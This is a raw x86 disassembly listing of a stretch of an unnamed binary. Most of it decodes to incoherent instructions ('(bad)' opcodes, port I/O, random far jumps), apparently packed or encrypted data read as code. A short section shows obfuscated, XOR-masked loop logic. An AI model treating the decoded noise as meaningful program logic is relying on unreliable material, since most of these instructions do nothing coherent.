  41eb76:	arpl   WORD PTR [ebx+0x17a751db],ax
  41eb7c:	jg     0x41eba7
  41eb7e:	ret    0x7f9e
  41eb81:	jae    0x41eb6d
  41eb83:	in     eax,dx
  41eb84:	mov    ecx,0x3d559f10
  41eb89:	je     0x41eb30
  41eb8b:	add    al,0x25
  41eb8d:	xchg   esp,eax
  41eb8e:	sbb    BYTE PTR [edx+0x314982c7],0x31
  41eb95:	stos   DWORD PTR es:[edi],eax
  41eb96:	sub    esp,DWORD PTR [ebx]
  41eb98:	lock pushf 
  41eb9a:	ins    DWORD PTR es:[edi],dx
  41eb9b:	cld    
  41eb9c:	mov    ebx,0xe4153d66
  41eba1:	sub    edi,DWORD PTR [ecx]
  41eba3:	cdq    
  41eba4:	push   edi
  41eba5:	sbb    eax,DWORD PTR [ebp+0x45]
  41eba8:	or     dl,bl
  41ebaa:	adc    edx,DWORD PTR [ecx+eax*4+0x61a809d6]
  41ebb1:	mov    WORD PTR [esi+0x1d48513c],es
  41ebb7:	mov    cl,0xc5
  41ebb9:	ret    
  41ebba:	fidiv  DWORD PTR [ebx]
  41ebbc:	sti    
  41ebbd:	fild   QWORD PTR [ebx-0x50]
  41ebc0:	cmp    al,0xd0
  41ebc2:	dec    BYTE PTR [ebp+ecx*8-0x30]
  41ebc6:	xor    BYTE PTR [esi-0x1ac42b4d],dh
  41ebcc:	nop
  41ebcd:	and    eax,DWORD PTR [esi+0x52]
  41ebd0:	sub    DWORD PTR [ebp+0x7c],ecx
  41ebd3:	jns    0x41ec15
  41ebd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd6:	xchg   BYTE PTR [edx+0x69],dh
  41ebd9:	(bad)  
  41ebda:	imul   esp,edi,0x5a
  41ebdd:	jno    0x41ebe9
  41ebdf:	add    ch,0xdc
  41ebe2:	fs aad 0xe7
  41ebe5:	xchg   ebp,eax
  41ebe6:	and    DWORD PTR [eax],edi
  41ebe8:	loope  0x41ec1e
  41ebea:	or     eax,0x6d294172
  41ebef:	jmp    0xbb91eb66
  41ebf4:	xchg   BYTE PTR [ebp-0x439d60a4],dh
  41ebfa:	ret    0xe27e
  41ebfd:	rol    DWORD PTR [ebp-0x53199483],0xa9
  41ec04:	sahf   
  41ec05:	jge    0x41ebc2
  41ec07:	repz inc esp
  41ec09:	mov    ecx,0x9ee3ddae
  41ec0e:	pop    es
  41ec0f:	(bad)  
  41ec10:	mov    eax,0xd1dd312b
  41ec15:	inc    ebp
  41ec16:	or     BYTE PTR [edx],bl
  41ec18:	pop    esi
  41ec19:	adc    edx,edi
  41ec1b:	xchg   BYTE PTR [eax+0x6adbd6ec],dh
  41ec21:	sub    al,0x88
  41ec23:	(bad)  
  41ec24:	fs sbb bl,BYTE PTR ds:[esi+0x3b20d8de]
  41ec2c:	mov    cl,0xe4
  41ec2e:	les    ebx,FWORD PTR [ecx-0x279933ed]
  41ec34:	add    eax,0x154757bf
  41ec39:	jmp    0xb3a7:0xe05bb8f9
  41ec40:	cmp    bh,BYTE PTR ds:0x8ed8fd1
  41ec46:	add    dh,BYTE PTR [ebx+0x2a]
  41ec49:	mov    ebp,0xfd82783a
  41ec4e:	inc    edx
  41ec4f:	cvtpi2ps xmm4,QWORD PTR [ebp-0xb]
  41ec53:	test   BYTE PTR ds:0x48bcca32,bh
  41ec59:	leave  
  41ec5a:	aas    
  41ec5b:	or     DWORD PTR [esi-0x208bb718],0xffffffc0
  41ec62:	ja     0x41ec65
  41ec64:	push   0x81af07cf
  41ec69:	adc    dl,BYTE PTR [ecx-0x4b]
  41ec6c:	adc    al,0x82
  41ec6e:	stos   BYTE PTR es:[edi],al
  41ec6f:	sub    DWORD PTR [edi],ebp
  41ec71:	inc    esi
  41ec72:	push   0xbd39f2e4
  41ec77:	(bad)  
  41ec79:	xor    al,0xcd
  41ec7b:	adc    DWORD PTR [esi+0x2],edx
  41ec7e:	arpl   WORD PTR [esi-0x49],ax
  41ec81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec82:	sub    BYTE PTR [edi],ch
  41ec84:	out    dx,eax
  41ec85:	sub    ecx,DWORD PTR [edi+0x264ba02f]
  41ec8b:	imul   edi,DWORD PTR [ecx],0x17
  41ec8e:	fdivp  st(0),st
  41ec90:	(bad)  
  41ec91:	lods   al,BYTE PTR ds:[esi]
  41ec92:	ins    BYTE PTR es:[edi],dx
  41ec93:	std    
  41ec94:	or     WORD PTR [ebp-0x28],cx
  41ec98:	out    dx,eax
  41ec99:	xchg   ebx,eax
  41ec9a:	sbb    al,0x7f
  41ec9c:	mov    bh,BYTE PTR [eax]
  41ec9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec9f:	and    edi,DWORD PTR [edx+0x41e4aaf5]
  41eca5:	aad    0x74
  41eca7:	test   al,0x9a
  41eca9:	pop    esi
  41ecaa:	and    eax,esi
  41ecac:	push   esi
  41ecad:	xchg   ebp,eax
  41ecae:	sahf   
  41ecaf:	out    dx,al
  41ecb0:	xchg   ebx,eax
  41ecb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecb2:	push   eax
  41ecb3:	mov    edi,0xa04ffca1
  41ecb8:	cmp    eax,0x29307c20
  41ecbd:	out    0x36,al
  41ecbf:	mov    edi,0xbfd72119
  41ecc4:	mov    cl,0xd
  41ecc6:	dec    edi
  41ecc7:	sub    bl,BYTE PTR [ebp-0x68e55302]
  41eccd:	mov    al,0x49
  41eccf:	sub    DWORD PTR [eax+0x3],edi
  41ecd2:	fisttp DWORD PTR [ecx]
  41ecd4:	gs or  ah,dh
  41ecd7:	xor    dh,bl
  41ecd9:	rol    DWORD PTR [edi-0xf],0xb4
  41ecdd:	into   
  41ecde:	push   ebp
  41ecdf:	data16 stc 
  41ece1:	cwde   
  41ece2:	add    dh,BYTE PTR [edx]
  41ece4:	add    ebx,ebp
  41ece6:	add    dh,ch
  41ece8:	jb     0x41ed4a
  41ecea:	shl    DWORD PTR [ecx+0x319f4331],0xdf
  41ecf1:	or     al,ah
  41ecf3:	js     0x41ecf1
  41ecf5:	add    al,0x2b
  41ecf7:	jmp    0x41ed74
  41ecf9:	or     al,0xd0
  41ecfb:	dec    esp
  41ecfc:	rcr    BYTE PTR [eax-0x7c95d849],cl
  41ed02:	arpl   WORD PTR [ebp-0x77],si
  41ed05:	test   BYTE PTR [eax+0x2a],al
  41ed08:	out    dx,eax
  41ed09:	sbb    eax,ebp
  41ed0b:	dec    bl
  41ed0d:	mov    WORD PTR [edi],ds
  41ed0f:	push   ss
  41ed10:	push   es
  41ed11:	xchg   edi,eax
  41ed12:	pop    eax
  41ed13:	mov    edi,0x79fdd6fc
  41ed18:	xor    al,0xb6
  41ed1a:	pop    es
  41ed1b:	inc    edi
  41ed1c:	and    esi,DWORD PTR cs:[edi+0x26284fa6]
  41ed23:	(bad)  
  41ed24:	retf   0x1c84
  41ed27:	int3   
  41ed28:	sbb    eax,0xa724ee70
  41ed2d:	push   0xfffffff1
  41ed2f:	mov    eax,ds:0xa1bbf24e
  41ed34:	pop    ebp
  41ed35:	aam    0xdc
  41ed37:	jne    0x41ed84
  41ed39:	out    0x8f,eax
  41ed3b:	xchg   esp,eax
  41ed3c:	ja     0x41ece0
  41ed3e:	ficom  WORD PTR [esi]
  41ed40:	hlt    
  41ed41:	aaa    
  41ed42:	and    DWORD PTR [eax-0xd],edx
  41ed45:	pop    esp
  41ed46:	clc    
  41ed47:	stos   BYTE PTR es:[edi],al
  41ed48:	sbb    eax,edx
  41ed4a:	mov    ecx,0xc8e5165c
  41ed4f:	sub    BYTE PTR [esi-0x7a],dh
  41ed52:	les    ecx,FWORD PTR [edx]
  41ed54:	xor    DWORD PTR [esi-0x56],ebx
  41ed57:	push   ss
  41ed58:	cmp    eax,0x521cc919
  41ed5d:	sub    ebp,0x32
  41ed60:	cmp    eax,0xcf79d94a
  41ed65:	lods   al,BYTE PTR ds:[esi]
  41ed66:	addr16 out dx,eax
  41ed68:	jno    0x41ecec
  41ed6a:	mov    al,ds:0x985ff00
  41ed6f:	sbb    eax,0x9da907ea
  41ed74:	adc    eax,DWORD PTR [ebp-0x260e40f6]
  41ed7a:	mov    ah,0xab
  41ed7c:	mov    bh,0xa8
  41ed7e:	xor    DWORD PTR [edx],0x72
  41ed81:	pop    ebp
  41ed82:	cmp    BYTE PTR ds:0x3f9053d,dh
  41ed88:	sbb    BYTE PTR [edi*1-0x66e298c3],ah
  41ed8f:	js     0x41ed82
  41ed91:	lods   eax,DWORD PTR ds:[esi]
  41ed92:	lods   al,BYTE PTR ds:[esi]
  41ed93:	es xor esi,0x848a2907
  41ed9a:	inc    ecx
  41ed9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9c:	and    DWORD PTR [ebp+edi*1-0x1a8561bc],ebx
  41eda3:	fwait
  41eda4:	mov    ?,WORD PTR [eax+ebp*4]
  41eda7:	lock inc esp
  41eda9:	outs   dx,BYTE PTR ds:[esi]
  41edaa:	inc    edx
  41edab:	loop   0x41edd1
  41edad:	popa   
  41edae:	mov    esp,0x8f04ebab
  41edb3:	(bad)  [esi-0x3f]
  41edb6:	loope  0x41ed43
  41edb8:	and    BYTE PTR [edx-0x78],dh
  41edbb:	or     eax,0xa1ee4e49
  41edc0:	mov    al,0x11
  41edc2:	push   es
  41edc3:	pushf  
  41edc4:	push   es
  41edc5:	test   eax,0xddbdd854
  41edca:	xchg   ebx,eax
  41edcb:	ror    BYTE PTR [edi-0x69],0xbc
  41edcf:	mov    dl,0x55
  41edd1:	ins    BYTE PTR es:[edi],dx
  41edd2:	or     al,0xac
  41edd4:	jne    0x41ee2c
  41edd6:	test   eax,0x9b8d8d2d
  41eddb:	jecxz  0x41eda1
  41eddd:	and    eax,ebx
  41eddf:	scas   al,BYTE PTR es:[edi]
  41ede0:	stc    
  41ede1:	stc    
  41ede2:	inc    ebx
  41ede3:	jae    0x41edb0
  41ede5:	cwde   
  41ede6:	push   ecx
  41ede7:	push   0x21
  41ede9:	and    al,dh
  41edeb:	(bad)  
  41edec:	in     al,dx
  41eded:	mov    al,0x8f
  41edef:	data16 fld QWORD PTR [edi-0x3d]
  41edf3:	lock cmp DWORD PTR [edx+0x5a],esp
  41edf7:	int3   
  41edf8:	sub    edx,DWORD PTR [ecx+0x46bf84a0]
  41edfe:	daa    
  41edff:	rcr    BYTE PTR [eax],0x4c
  41ee02:	test   DWORD PTR [esi-0x121b4a14],ebp
  41ee08:	out    dx,al
  41ee09:	iret   
  41ee0a:	mov    eax,ds:0xf5aeb5a
  41ee0f:	jg     0x41ee8c
  41ee11:	mov    al,0x94
  41ee13:	cmp    DWORD PTR [edi],edi
  41ee15:	xchg   ebp,eax
  41ee16:	inc    esi
  41ee17:	fwait
  41ee18:	hlt    
  41ee19:	and    al,BYTE PTR [ebx]
  41ee1b:	std    
  41ee1c:	out    0xab,eax
  41ee1e:	cli    
  41ee1f:	add    eax,DWORD PTR [edi+ebx*4+0x63]
  41ee23:	push   esp
  41ee24:	and    DWORD PTR [ebx],edx
  41ee26:	out    0xb1,eax
  41ee28:	push   edx
  41ee29:	push   esi
  41ee2a:	jl     0x41ede6
  41ee2c:	mov    ebx,0xa4057499
  41ee31:	pop    edi
  41ee32:	jbe    0x41ee37
  41ee34:	mov    dl,0x46
  41ee36:	jae    0x41eea5
  41ee38:	dec    esi
  41ee39:	scas   al,BYTE PTR es:[edi]
  41ee3a:	std    
  41ee3b:	pop    ss
  41ee3c:	aad    0x8
  41ee3e:	or     BYTE PTR [ecx-0x7],dh
  41ee41:	xor    DWORD PTR [edi-0x62],0xd243579c
  41ee48:	add    BYTE PTR [ebp+edx*4+0xf],cl
  41ee4c:	mov    eax,ds:0xbc177b1
  41ee51:	test   eax,0xe2e77de3
  41ee56:	inc    edi
  41ee57:	lods   eax,DWORD PTR ds:[esi]
  41ee58:	cmc    
  41ee59:	aas    
  41ee5a:	lds    ecx,FWORD PTR [esi+0x32416b6a]
  41ee60:	cmp    cl,BYTE PTR [edx-0x1c]
  41ee63:	sub    BYTE PTR [edi+0x65],dh
  41ee66:	push   edi
  41ee67:	popf   
  41ee68:	pop    esi
  41ee69:	xor    al,0x79
  41ee6b:	fdiv   QWORD PTR [ebx-0x58e2a9a0]
  41ee71:	sbb    DWORD PTR [ecx+0x636297fd],ebp
  41ee77:	pop    edi
  41ee78:	mov    BYTE PTR [eax],bl
  41ee7a:	push   0xa5f55a77
  41ee7f:	adc    eax,eax
  41ee81:	test   al,0x5
  41ee83:	lea    eax,[ebx]
  41ee85:	jne    0x41ee92
  41ee87:	pop    es
  41ee88:	ds retf 
  41ee8a:	sbb    DWORD PTR [ebp+0x5907671d],ebx
  41ee90:	out    dx,al
  41ee91:	ins    BYTE PTR es:[edi],dx
  41ee92:	cmc    
  41ee93:	sahf   
  41ee94:	push   ecx
  41ee95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee96:	jl     0x41ee1b
  41ee98:	cmp    DWORD PTR [ebp*1-0x4104ef7d],eax
  41ee9f:	push   ebx
  41eea0:	adc    dh,bl
  41eea2:	in     eax,0x85
  41eea4:	dec    edx
  41eea5:	dec    edi
  41eea6:	mov    ch,0xf0
  41eea8:	sub    ch,cl
  41eeaa:	adc    dl,0x58
  41eead:	inc    ebp
  41eeaf:	dec    esp
  41eeb0:	sbb    dl,BYTE PTR [ebx+0x17644e41]
  41eeb6:	repz jl 0x41ef0f
  41eeb9:	popa   
  41eeba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eebb:	pop    edi
  41eebc:	outs   dx,BYTE PTR ds:[esi]
  41eebd:	in     eax,dx
  41eebe:	dec    ebx
  41eebf:	push   es
  41eec0:	add    ch,BYTE PTR [ecx-0x715b55dc]
  41eec6:	cmp    ch,al
  41eec8:	push   edi
  41eec9:	inc    ebp
  41eeca:	pop    esi
  41eecb:	mov    ah,0x44
  41eecd:	jge    0x41ef1d
  41eecf:	push   esi
  41eed0:	fs daa 
  41eed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed3:	xlat   BYTE PTR ds:[ebx]
  41eed4:	mov    edx,0xa40a2bb0
  41eed9:	add    eax,0x787aa8fc
  41eede:	loopne 0x41ef01
  41eee0:	lds    esi,FWORD PTR [ecx+0x33f4ffda]
  41eee6:	adc    eax,0x48a4392d
  41eeeb:	dec    DWORD PTR [ecx+edi*2-0x4e]
  41eeef:	dec    edi
  41eef0:	jmp    0xb318:0x6f7f638
  41eef7:	pop    ebx
  41eef8:	inc    esi
  41eef9:	sbb    BYTE PTR [ecx+0x1f9e9b5f],ah
  41eeff:	(bad)  
  41ef00:	jp     0x41ef4c
  41ef02:	jl     0x41ef55
  41ef04:	and    eax,0xae1d70c9
  41ef09:	loop   0x41ef7f
  41ef0b:	ins    DWORD PTR es:[edi],dx
  41ef0c:	cmp    al,0x8b
  41ef0e:	mov    cl,0x38
  41ef10:	dec    ebx
  41ef11:	pop    esp
  41ef12:	dec    esp
  41ef13:	push   cs
  41ef14:	lahf   
  41ef15:	(bad)  
  41ef16:	xor    cl,BYTE PTR [edi+eiz*4+0x5aff0b7]
  41ef1d:	dec    esp
  41ef1e:	rol    BYTE PTR [esi-0x46748286],cl
  41ef24:	(bad)  
  41ef25:	out    0x6b,eax
  41ef27:	push   edx
  41ef28:	mov    dh,0x6d
  41ef2a:	adc    bh,BYTE PTR ds:0xec495f5f
  41ef30:	rcl    DWORD PTR [edi+0x6f],1
  41ef33:	adc    eax,0xc4ebcaa5
  41ef38:	and    ebp,DWORD PTR ds:0x23aa08a2
  41ef3e:	outs   dx,BYTE PTR ds:[esi]
  41ef3f:	aad    0xe6
  41ef41:	ror    BYTE PTR [esi+0x0],cl
  41ef44:	stc    
  41ef45:	mov    cl,0x4f
  41ef47:	jge    0x41ef55
  41ef49:	std    
  41ef4a:	sti    
  41ef4b:	xlat   BYTE PTR ds:[ebx]
  41ef4c:	jmp    0xc559:0x4620671f
  41ef53:	dec    eax
  41ef54:	lahf   
  41ef55:	nop
  41ef56:	mov    al,0xbe
  41ef58:	out    dx,al
  41ef59:	mov    ds:0x361d53d8,eax
  41ef5e:	mov    ch,0xc4
  41ef60:	test   ah,bl
  41ef62:	fmul   QWORD PTR [esi]
  41ef64:	cmovbe eax,ebp
  41ef67:	call   0x1bab100f
  41ef6c:	lods   al,BYTE PTR ds:[esi]
  41ef6d:	xlat   BYTE PTR ds:[ebx]
  41ef6e:	je     0x41efe9
  41ef70:	ret    0xd612
  41ef73:	lea    ebp,[edi+0x10df2717]
  41ef79:	xchg   edx,eax
  41ef7a:	aad    0x10
  41ef7c:	enter  0xb245,0x3d
  41ef80:	adc    ebp,0x31
  41ef83:	mov    ebp,0x1c15263a
  41ef88:	pop    ds
  41ef89:	push   cs
  41ef8a:	push   edi
  41ef8b:	(bad)  
  41ef8c:	les    esi,FWORD PTR [esi+0x42]
  41ef8f:	ror    DWORD PTR [ecx-0x2e],cl
  41ef92:	fbstp  TBYTE PTR [eax+0x38]
  41ef95:	std    
  41ef96:	retf   
  41ef97:	push   esi
  41ef98:	retf   
  41ef99:	dec    edx
  41ef9a:	mov    bl,0x63
  41ef9c:	ret    0x4fda
  41ef9f:	fs xchg edi,eax
  41efa1:	stc    
  41efa2:	mov    ch,0x10
  41efa4:	or     edi,ecx
  41efa6:	push   eax
  41efa7:	leave  
  41efa8:	mov    ebx,0x7c5cee8a
  41efad:	test   BYTE PTR ds:0x48fe07e7,ah
  41efb3:	cmc    
  41efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efb5:	jo     0x41efa2
  41efb7:	inc    eax
  41efb8:	test   DWORD PTR [ebx-0x6a],0xd62c3dfa
  41efbf:	or     ebx,DWORD PTR ds:0x147c10de
  41efc5:	jecxz  0x41efb7
  41efc7:	call   0x4b59af61
  41efcc:	sub    ecx,DWORD PTR ds:0x955cf861
  41efd2:	mov    es:0xa948a61c,eax
  41efd8:	fincstp 
  41efdb:	push   ebx
  41efdc:	mov    cs,esp
  41efde:	out    0xf3,al
  41efe0:	sbb    al,0x1
  41efe2:	fbld   TBYTE PTR [edi]
  41efe4:	cmp    dh,BYTE PTR [ebp+0x6c]
  41efe7:	imul   ebp,DWORD PTR [ebp+0x13],0x2b
  41efeb:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efed:	ins    DWORD PTR es:[di],dx
  41efef:	dec    eax
  41eff0:	into   
  41eff1:	xor    ecx,0x49ab2e7f
  41eff7:	mov    ecx,0x69feb6d0
  41effc:	mov    al,ds:0x3c833ff
  41f001:	into   
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xdb9a6403
  41f0bf:	imul   edx,DWORD PTR [ebx+0x51],0x3c6261d8
  41f0c6:	pop    edi
  41f0c7:	bound  esp,QWORD PTR [edx+0x68]
  41f0ca:	imul   esi,DWORD PTR [edi-0x52],0x292fffa4
  41f0d1:	adc    DWORD PTR [eax],edi
  41f0d3:	mov    eax,fs
  41f0d5:	inc    ebp
  41f0d6:	sub    WORD PTR [edi],0x5c
  41f0da:	pop    ss
  41f0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0dc:	pushf  
  41f0dd:	clc    
  41f0de:	pop    edx
  41f0df:	(bad)  [ebp-0x29]
  41f0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0e3:	add    eax,0xa7deb535
  41f0e8:	outs   dx,DWORD PTR ds:[esi]
  41f0e9:	sahf   
  41f0ea:	fwait
  41f0eb:	sar    DWORD PTR [edx-0x6a],0x9f
  41f0ef:	stos   BYTE PTR es:[edi],al
  41f0f0:	jecxz  0x41f163
  41f0f2:	jne    0x41f126
  41f0f4:	ret    0x586e
  41f0f7:	in     eax,0x86
  41f0f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0fb:	repz not BYTE PTR [esi-0x76aa1e67]
  41f102:	inc    edx
  41f103:	push   es
  41f104:	or     edi,DWORD PTR [esi+0x52d03c51]
  41f10a:	dec    esi
  41f10b:	js     0x41f186
  41f10d:	into   
  41f10e:	outs   dx,DWORD PTR ds:[esi]
  41f10f:	ins    DWORD PTR es:[edi],dx
  41f110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f111:	lds    eax,FWORD PTR [edi-0xa873fb2]
  41f117:	adc    ebx,0xc
  41f11a:	mov    edi,DWORD PTR ds:0xd2e7ed66
  41f120:	aaa    
  41f121:	mul    BYTE PTR [ebp-0x79cd25f6]
  41f127:	pop    esi
  41f128:	rcl    BYTE PTR [ecx-0x2f],0xb3
  41f12c:	mov    DWORD PTR [eax+0x59],eax
  41f12f:	out    0x3,eax
  41f131:	std    
  41f132:	out    dx,al
  41f133:	repnz xor al,0x2b
  41f136:	(bad)
  41f139:	imul   edx,DWORD PTR [ebp+0x23],0xfd0dc98
  41f140:	inc    ecx
  41f141:	pop    ss
  41f142:	sbb    bh,ah
  41f144:	cmp    edx,ebx
  41f146:	ins    DWORD PTR es:[edi],dx
  41f147:	retf   
  41f148:	bound  edi,QWORD PTR [ebp+0x19]
  41f14b:	mov    esp,0xde027a40
  41f150:	xchg   esi,eax
  41f151:	inc    edi
  41f152:	push   0x408c75a3
  41f157:	mov    BYTE PTR [edx+0x6c],dh
  41f15a:	sbb    ch,ah
  41f15c:	push   ss
  41f15d:	push   eax
  41f15e:	adc    al,0xb9
  41f160:	or     esp,DWORD PTR [eax+0x1e]
  41f163:	adc    al,BYTE PTR [eax]
  41f165:	jno    0x41f138
  41f167:	cmp    BYTE PTR [ebx],dh
  41f169:	sub    ah,BYTE PTR [edx-0x62ed1297]
  41f16f:	jbe    0x41f160
  41f171:	ds jecxz 0x41f1a4
  41f174:	mov    al,ds:0xbf77ac0e
  41f179:	pusha  
  41f17a:	add    eax,0x75f30810
  41f17f:	loope  0x41f1ba
  41f181:	dec    esp
  41f182:	cwde   
  41f183:	arpl   WORD PTR [ebx+ebp*4+0x5a19e5f],cx
  41f18a:	pop    ds
  41f18b:	int    0xf0
  41f18d:	inc    ebp
  41f18e:	dec    ecx
  41f18f:	jmp    0x4cb2:0x628e0e88
  41f196:	and    dl,BYTE PTR [esi+0x1688417c]
  41f19c:	frndint 
  41f19e:	neg    DWORD PTR [ebp+0x4]
  41f1a1:	and    DWORD PTR [edx+0x1ccccbdb],0xffffffd8
  41f1a8:	cdq    
  41f1a9:	(bad)  
  41f1aa:	pop    ecx
  41f1ab:	rcl    ebp,cl
  41f1ad:	sub    ecx,0x1
  41f1b0:	mov    esp,DWORD PTR [edx]
  41f1b2:	cwde   
  41f1b3:	mov    ds:0xeb5d6c8a,eax
  41f1b8:	clc    
  41f1b9:	daa    
  41f1ba:	stc    
  41f1bb:	(bad)  
  41f1bc:	(bad)  
  41f1bd:	stos   DWORD PTR es:[edi],eax
  41f1be:	daa    
  41f1bf:	mov    BYTE PTR [ebx-0x3b],dl
  41f1c2:	mov    edx,ecx
  41f1c4:	sar    BYTE PTR [eax+0xb],0xc0
  41f1c8:	aam    0xfa
  41f1ca:	scas   eax,DWORD PTR es:[edi]
  41f1cb:	dec    esi
  41f1cc:	and    al,0x58
  41f1ce:	sub    ah,BYTE PTR [edx-0x7a]
  41f1d1:	fs or  eax,0xb060c6b0
  41f1d7:	sbb    esi,esp
  41f1d9:	dec    ecx
  41f1da:	lods   eax,DWORD PTR ds:[esi]
  41f1db:	xor    DWORD PTR [esi-0x17],0xffffffa2
  41f1df:	fadd   QWORD PTR [esp+edx*2+0x3c]
  41f1e3:	push   eax
  41f1e4:	adc    al,0x84
  41f1e6:	pushf  
  41f1e7:	pushf  
  41f1e8:	cwde   
  41f1e9:	xchg   BYTE PTR [edx+eax*1],al
  41f1ec:	push   edi
  41f1ed:	jl     0x41f1e7
  41f1ef:	popf   
  41f1f0:	pusha  
  41f1f1:	jge    0x41f196
  41f1f3:	push   DWORD PTR [esi+0x5b4697d6]
  41f1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1fa:	pop    ecx
  41f1fb:	mov    eax,ds:0x7047ddb6
  41f200:	cmp    esp,ebx
  41f202:	daa    
  41f203:	xchg   DWORD PTR [ecx-0x2a5a3d6c],edi
  41f209:	out    0x34,al
  41f20b:	inc    ebx
  41f20c:	daa    
  41f20d:	arpl   WORD PTR [edi],dx
  41f20f:	mov    al,0x50
  41f211:	loopne 0x41f24f
  41f213:	cli    
  41f214:	pop    ebp
  41f215:	in     eax,0xd9
  41f217:	sub    bl,BYTE PTR [ebx-0x2581dae6]
  41f21d:	jo     0x41f1ea
  41f21f:	add    cl,cl
  41f221:	mov    ecx,0xe5220293
  41f226:	xor    al,0x2f
  41f228:	in     al,dx
  41f229:	ja     0x41f28e
  41f22b:	inc    ebx
  41f22c:	adc    edx,DWORD PTR [eax-0x55]
  41f22f:	mov    dl,0x84
  41f231:	adc    al,0xad
  41f233:	loop   0x41f1f5
  41f235:	out    dx,eax
  41f236:	xchg   DWORD PTR [edi+0x7f59887e],esi
  41f23c:	xchg   BYTE PTR [edi],dl
  41f23e:	pop    esi
  41f23f:	sub    BYTE PTR [ecx],al
  41f241:	out    dx,al
  41f242:	and    dh,bh
  41f244:	sub    ch,BYTE PTR [ebx+0x15]
  41f247:	out    0xd,eax
  41f249:	icebp  
  41f24a:	jne    0x41f1d4
  41f24c:	test   al,0x58
  41f24e:	ja     0x41f1e0
  41f250:	or     eax,0xa480c7ab
  41f255:	jl     0x41f279
  41f257:	mov    edx,0xfcea46e
  41f25c:	pop    ebp
  41f25d:	pop    edx
  41f25e:	(bad)  
  41f260:	fbstp  TBYTE PTR [ebp-0x522a0cae]
  41f266:	dec    ebx
  41f267:	ror    dl,1
  41f269:	add    ah,cl
  41f26b:	ds cmc 
  41f26d:	fwait
  41f26e:	jno    0x41f21d
  41f270:	mov    bh,0x1f
  41f272:	push   0xffffff97
  41f274:	out    0xbc,al
  41f276:	jge    0x41f228
  41f278:	push   es
  41f279:	test   al,0x27
  41f27b:	mov    WORD PTR [ebx-0x225941b6],fs
  41f281:	xchg   ecx,eax
  41f282:	addr16 push edx
  41f284:	dec    esp
  41f285:	adc    al,0x9c
  41f287:	mov    bl,0xec
  41f289:	ror    BYTE PTR [edx-0x2323e903],cl
  41f28f:	ret    
  41f290:	popf   
  41f291:	and    BYTE PTR [eax-0x5312bd69],al
  41f297:	popa   
  41f298:	stos   BYTE PTR es:[edi],al
  41f299:	inc    edi
  41f29a:	push   0xb
  41f29c:	mov    esp,0x50baae92
  41f2a1:	sbb    ebp,DWORD PTR [ecx+0x3d]
  41f2a4:	pop    edx
  41f2a5:	xlat   BYTE PTR ds:[ebx]
  41f2a6:	and    sp,di
  41f2a9:	sub    al,0x28
  41f2ab:	pop    edx
  41f2ac:	idiv   DWORD PTR [ecx]
  41f2ae:	mov    dl,0xfa
  41f2b0:	pusha  
  41f2b1:	(bad)  
  41f2b2:	xor    eax,0xdf8683a9
  41f2b7:	mov    edx,0x25e99081
